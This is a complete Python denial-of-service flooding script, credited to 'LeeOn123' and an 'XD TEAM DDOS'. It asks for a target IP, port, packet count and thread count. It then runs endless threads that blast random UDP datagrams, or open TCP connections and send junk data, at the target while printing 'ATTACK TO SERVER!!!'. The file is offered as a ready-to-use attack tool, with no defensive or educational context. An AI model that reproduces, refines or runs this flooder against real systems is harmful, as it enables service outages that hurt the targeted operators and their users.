#!/usr/bin/env python3
#Code by LeeOn123
#remake by xd team
import random
import socket
import threading

print("--> CREDITS : LEOON TCP UDP <--")
print("--> REMAKE BY SHCEEZY <--")
print("--> XD TEAM DDOS <--")
print("#-- JOIN THIS IS COMUNITY --#")
ip = str(input(" IP:"))
port = int(input(" PORT:"))
choice = str(input(" Y ORE N(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ATTACK TO SERVER!!!")
		except:
			print("[!] ATTACK TO SERVER!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ATTACK TO SERVER!!!")
		except:
			s.close()
			print("[*] ATTACK TO SERVER")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()